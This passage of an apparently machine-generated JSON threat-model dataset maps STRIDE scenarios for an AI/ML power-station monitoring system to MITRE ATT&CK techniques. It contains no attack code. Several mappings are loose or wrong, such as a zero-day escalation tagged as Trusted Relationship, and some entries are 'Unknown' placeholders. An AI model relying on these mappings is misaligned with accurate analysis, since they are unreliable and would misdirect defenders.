                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker overwhelms the Data Logger with excessive data traffic.",
            "Assumptions": [
                {
                    "Assumption": "The Data Logger can be accessed via the network.",
                    "Role": "Attacker",
                    "Condition": "Network access."
                },
                {
                    "Assumption": "No rate limiting or traffic filtering mechanisms are in place.",
                    "Role": "Network administrator",
                    "Condition": "Lack of traffic control measures."
                }
            ],
            "Potential Impact": "Reduced data logger performance, causing potential data collection issues.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network traffic",
                "data logger",
                "performance degradation"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An insider launches a logic bomb to disrupt AI/ML model predictions.",
            "Assumptions": [
                {
                    "Assumption": "The insider has privileged access to the AI/ML environment.",
                    "Role": "Insider",
                    "Condition": "Privileged access granted."
                },
                {
                    "Assumption": "Sufficient monitoring and alerting systems are not in place.",
                    "Role": "System administrator",
                    "Condition": "Lack of monitoring."
                }
            ],
            "Potential Impact": "Disruption of predictive maintenance and power optimization functions.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "insider attack",
                "AI/ML models",
                "logic bomb"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the TOREADOR Platform to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "There exists a zero-day vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Unpatched system vulnerability."
                },
                {
                    "Assumption": "The attacker has network access to the TOREADOR Platform.",
                    "Role": "Attacker",
                    "Condition": "Network access."
                }
            ],
            "Potential Impact": "Gaining administrative control, compromising data confidentiality, integrity, and availability.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "zero-day vulnerability",
                "TOREADOR platform",
                "administrative control"
            ],
            "mitre_technique": {
                "name": "Trusted Relationship",
                "description": "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.\n\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)\n\nIn Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.(Citation: Office 365 Delegated Administration)",
                "id": "attack-pattern--9fa07bef-9c81-421e-a8e5-ad4366c5a925",
                "technique_id": "T1199"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user escalates privileges within the Dashboard to access restricted features.",
            "Assumptions": [
                {
                    "Assumption": "The user has valid credentials with some privileges.",
                    "Role": "User",
                    "Condition": "Insufficient access control."
                },
                {
                    "Assumption": "Access control mechanisms are flawed or misconfigured.",
                    "Role": "System administrator",
                    "Condition": "Access control misconfiguration."
                }
            ],
            "Potential Impact": "Access to sensitive data and administrative functionalities, leading to potential misuse.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "access control",
                "dashboard",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Windows File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nWindows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018)\n\nAdversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).",
                "id": "attack-pattern--34e793de-0274-4982-9c1a-246ed1c19dee",
                "technique_id": "T1222.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages a misconfigured Anonymity Agent to gain access to pre-processed data.",
            "Assumptions": [
                {
                    "Assumption": "The Anonymity Agent has weak access controls.",
                    "Role": "System architect",
                    "Condition": "Weak access control configuration."
                },
                {
                    "Assumption": "The attacker has access to the network path of the Anonymity Agent.",
                    "Role": "Attacker",
                    "Condition": "Network access."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive pre-processed data, impacting data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "anonymity agent",
                "access control",
                "network access"
            ],
            "mitre_technique": {
                "name": "File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ",
                "id": "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196",
                "technique_id": "T1222"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "23",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a trusted sensor device to send malicious data to the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "The network communication interface does not adequately verify the authenticity of connected devices.",
                    "Role": "Network Administrator",
                    "Condition": "Active network monitoring is lax or insufficient."
                },
                {
                    "Assumption": "The attacker has the technical ability to replicate sensor communication protocols.",
                    "Role": "Attacker",
                    "Condition": "The attacker has access to technical documentation or prior knowledge of the sensor's communication method."
                },
                {
                    "Assumption": "The Data Logger does not implement a secondary verification mechanism.",
                    "Role": "System Architect",
                    "Condition": "The implementation of such a mechanism was deemed unnecessary or too costly."
                }
            ],
            "Potential Impact": "Unauthorized data might lead to incorrect AI/ML predictions, affecting decision-making.",
            "MITRE ATT&CK Keywords": [
                "device",
                "network",
                "spoofing",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains access to an employee's dashboard login credentials through phishing.",
            "Assumptions": [
                {
                    "Assumption": "The phishing attempt bypasses email security filters.",
                    "Role": "Security Administrator",
                    "Condition": "Advanced phishing techniques or lack of updated filters."
                },
                {
                    "Assumption": "The employee does not use multi-factor authentication.",
                    "Role": "Employee",
                    "Condition": "Multi-factor authentication is not enforced or utilized."
                },
                {
                    "Assumption": "The attacker can convincingly mimic legitimate login interfaces.",
                    "Role": "Attacker",
                    "Condition": "The attacker has high technical skill and access to legitimate-looking phishing kits."
                }
            ],
            "Potential Impact": "Unauthorized access may lead to data theft or system manipulation.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "credential harvesting",
                "spoofing",
                "account takeover"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)\n\nAdversaries may also embed \u201ctracking pixels\u201d, \"web bugs\", or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.(Citation: NIST Web Bug) (Citation: Ryte Wiki) These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. (Citation: Ryte Wiki)(Citation: IAPP)\n\nAdversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.(Citation: ZScaler BitB 2020)(Citation: Mr. D0x BitB 2022)\n\nAdversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)) in addition to their username and password. This may enable the adversary to then bypass MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).(Citation: Proofpoint Human Factor)\n\nAdversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as \u201cquishing\u201d). These links may direct a victim to a credential phishing page.(Citation: QR-campaign-energy-firm) By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans.(Citation: qr-phish-agriculture) These QR codes may be scanned by or delivered directly  to a user\u2019s mobile device (i.e., [Phishing](https://attack.mitre.org/techniques/T1660)), which may be less secure in several relevant ways.(Citation: qr-phish-agriculture) For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile\u2019s smaller form factor.\n\nFrom the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",
                "id": "attack-pattern--2d3f5b3c-54ca-4f4d-bb1f-849346d31230",
                "technique_id": "T1598.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the Anon Agent to insert non-anonymized data into the system.",
            "Assumptions": [
                {
                    "Assumption": "The Anon Agent's verification methods can be bypassed.",
                    "Role": "System Developer",
                    "Condition": "Potential weaknesses or vulnerabilities in the agent's verification methods."
                },
                {
                    "Assumption": "The attacker has the ability to redirect or intercept communications between components.",
                    "Role": "Attacker",
                    "Condition": "Adequate understanding of network configurations and potential vulnerabilities."
                },
                {
                    "Assumption": "There is no real-time monitoring or alerts for anomalous data entries.",
                    "Role": "System Administrator",
                    "Condition": "Lack of comprehensive real-time monitoring solutions."
                }
            ],
            "Potential Impact": "Data integrity is compromised, leading to inaccurate AI/ML model training.",
            "MITRE ATT&CK Keywords": [
                "data injection",
                "network spoofing",
                "anonymity bypass",
                "data manipulation"
            ],
            "mitre_technique": {
                "name": "Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: Sygnia Elephant Beetle Jan 2022) By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.\n\nThe type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--ac9e6b22-11bf-45d7-9181-c1cb08360931",
                "technique_id": "T1565"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the firmware of a sensor device.",
            "Assumptions": [
                {
                    "Assumption": "Physical access to the sensor devices is possible.",
                    "Role": "Attacker",
                    "Condition": "Lack of physical security at power station sites."
                },
                {
                    "Assumption": "The firmware update process is not adequately secured.",
                    "Role": "System Developer",
                    "Condition": "The process lacks proper validation checks or uses weak cryptography."
                },
                {
                    "Assumption": "The attacker has sufficient technical knowledge to alter firmware.",
                    "Role": "Attacker",
                    "Condition": "The knowledge is readily accessible or the attacker has reverse-engineering skills."
                }
            ],
            "Potential Impact": "Data integrity is compromised, leading to faulty predictions and operational inefficiencies.",
            "MITRE ATT&CK Keywords": [
                "firmware tampering",
                "hardware manipulation",
                "device",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies data being sent from the Data Logger to the Receiver.",
            "Assumptions": [
                {
                    "Assumption": "The communication channel is not encrypted.",
                    "Role": "Network Administrator",
                    "Condition": "Encryption is not implemented due to performance concerns or oversight."
                },
                {
                    "Assumption": "The attacker has access to network infrastructure or has performed a successful man-in-the-middle attack.",
                    "Role": "Attacker",
                    "Condition": "Vulnerabilities in network security protocols are present."
                },
                {
                    "Assumption": "Real-time data integrity checks are not performed on received data.",
                    "Role": "System Developer",
                    "Condition": "Such checks are considered unnecessary or are inadequately implemented."
                }
            ],
            "Potential Impact": "Data integrity is compromised, affecting the accuracy of AI/ML model predictions.",
            "MITRE ATT&CK Keywords": [
                "man-in-the-middle",
                "data tampering",
                "unencrypted communication",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An insider alters metadata associated with sensor data to skew AI/ML model training.",
            "Assumptions": [
                {
                    "Assumption": "Insiders have write access to metadata storage.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient role-based access control policies."
                },
                {
                    "Assumption": "The modifications are not checked or audited in real-time.",
                    "Role": "Security Administrator",
                    "Condition": "Lack of real-time monitoring and auditing mechanisms."
                },
                {
                    "Assumption": "No version control or change management for metadata.",
                    "Role": "System Developer",
                    "Condition": "Metadata changes are not versioned or tracked."
                }
            ],
            "Potential Impact": "Data integrity is compromised, resulting in inaccurate and untrustworthy model predictions.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "metadata tampering",
                "data integrity",
                "privilege abuse"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An employee denies making critical changes to AI/ML model parameters after a system failure.",
            "Assumptions": [
                {
                    "Assumption": "Log entries for changes are not adequately detailed.",
                    "Role": "System Developer",
                    "Condition": "Logging mechanisms do not capture sufficient details."
                },
                {
                    "Assumption": "No multi-user accountability in place.",
                    "Role": "System Administrator",
                    "Condition": "Role-based access control is not strictly enforced."
                },
                {
                    "Assumption": "No forensic capabilities to reconstruct events.",
                    "Role": "Security Administrator",
                    "Condition": "Lack of forensic tools or expertise."
                }
            ],
            "Potential Impact": "Data integrity and system availability are compromised, potentially impacting operational efficiency.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "non-repudiation",
                "insider threat",
                "system failure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An external party claims that their data was used without consent due to lack of anonymization.",
            "Assumptions": [
                {
                    "Assumption": "The anonymization process has gaps or failures.",
                    "Role": "System Architect",
                    "Condition": "Incomplete or faulty anonymization logic."
                },
                {
                    "Assumption": "Audit logs for anonymization are incomplete or missing.",
                    "Role": "Security Administrator",
                    "Condition": "Insufficient logging practices."
                },
                {
                    "Assumption": "No proof of data provenance or consent.",
                    "Role": "Data Compliance Officer",
                    "Condition": "Lack of robust data handling protocols."
                }
            ],
            "Potential Impact": "Data confidentiality is compromised, leading to potential legal and reputational risks.",
            "MITRE ATT&CK Keywords": [
                "data anonymization failure",
                "repudiation",
                "data consent",
                "privacy"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An operator denies altering sensor data configurations leading to incorrect predictions.",
            "Assumptions": [
                {
                    "Assumption": "Configuration change logs are not detailed or are easily tampered with.",
                    "Role": "System Developer",
                    "Condition": "Weak logging mechanisms."
                },
                {
                    "Assumption": "No multi-user authentication for configuration changes.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient authentication policies."
                },
                {
                    "Assumption": "Lack of real-time monitoring and alerts for configuration changes.",
                    "Role": "Security Administrator",
                    "Condition": "No monitoring system in place."
                }
            ],
            "Potential Impact": "Data integrity and availability are compromised, affecting predictive accuracy and system reliability.",
            "MITRE ATT&CK Keywords": [
                "configuration tampering",
                "log manipulation",
                "non-repudiation",
                "monitoring"
            ],
            "mitre_technique": {
                "name": "Masquerading",
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",
                "id": "attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0",
                "technique_id": "T1036"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted data transmission between Data Logger and Receiver.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted without encryption.",
                    "Role": "Network Administrator",
                    "Condition": "Encryption is not implemented."
                },
                {
                    "Assumption": "The attacker has the capability to intercept network traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to network infrastructure or proximity to communication channels."
                },
                {
                    "Assumption": "No detection mechanisms for unauthorized access to network traffic.",
                    "Role": "Security Administrator",
                    "Condition": "Lack of or ineffective network monitoring tools."
                }
            ],
            "Potential Impact": "Data confidentiality is compromised, leading to potential leakage of sensitive operational data.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "unencrypted communication",
                "network",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An insider accesses sensitive metadata without authorization.",
            "Assumptions": [
                {
                    "Assumption": "Insiders have broad access to metadata without proper restrictions.",
                    "Role": "System Administrator",
                    "Condition": "Lack of role-based access controls."
                },
                {
                    "Assumption": "No regular audits of access to metadata.",
                    "Role": "Security Administrator",
                    "Condition": "Insufficient or irregular access audits."
                },
                {
                    "Assumption": "No alerting mechanism for unauthorized metadata access.",
                    "Role": "System Developer",
                    "Condition": "Lack of monitoring and alerting tools."
                }
            ],
            "Potential Impact": "Data confidentiality is compromised, potentially leading to misuse of sensitive metadata.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "unauthorized access",
                "metadata",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Masquerading",
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",
                "id": "attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0",
